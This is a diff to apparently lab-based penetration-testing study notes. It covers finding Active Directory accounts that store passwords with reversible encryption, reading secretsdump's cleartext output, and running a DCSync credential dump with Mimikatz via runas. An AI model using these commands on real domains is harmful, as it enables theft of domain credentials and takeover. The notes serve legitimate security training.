@@ -284,11 +284,48 @@ If we check the files created using the `-just-dc` flag, we will see that there 
 ls inlanefreight_hashes*
 ```
 
+- **Viewing an Account with Reversible Encryption Password Storage Set**
 
+![image](https://github.com/user-attachments/assets/374b5f45-ab82-402f-a304-d155e919aa46)
 
+When this option is set on a user account, it does not mean that the passwords are stored in cleartext. Instead, they are stored using RC4 encryption. The trick here is that the key needed to decrypt them is stored in the registry (the `Syskey`) and can be extracted by a Domain Admin or equivalent. Tools such as secretsdump.py will decrypt any passwords stored using reversible encryption while dumping the NTDS file either as a Domain Admin or using an attack such as DCSync. If this setting is disabled on an account, a user will need to change their password for it to be stored using one-way encryption. Any passwords set on accounts with this setting enabled will be stored using reversible encryption until they are changed. We can enumerate this using the `Get-ADUser` cmdlet:
 
+- **Enumerating Further using Get-ADUser**
 
+```
+Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
+```
 
+We can see that one account, proxyagent, has the reversible encryption option set with PowerView as well
+
+- **Checking for Reversible Encryption Option using Get-DomainUser**
+```
+Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
+```
+
+- **Displaying the Decrypted Password**
+```
+cat inlanefreight_hashes.ntds.cleartext
+```
+
+## DCSync using Mimikatz
+
+We can perform the attack with Mimikatz as well. Using Mimikatz, we must target a specific user. Here we will target the built-in `administrator` account. We could also target the `krbtgt` account and use this to create a **Golden Ticket** for persistence, but that is outside the scope of this module.
+
+Also it is important to note that Mimikatz must be ran in the context of the user who has DCSync privileges. We can utilize **`runas.exe`** to accomplish this:
+
+- Using runas.exe
+```
+runas /netonly /user:INLANEFREIGHT\adunn powershell
+```
+
+- **Performing the Attack with Mimikatz**
+```
+.\mimikatz.exe
+> privilege::debug
+> lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
+sec  
+```
 
 
 
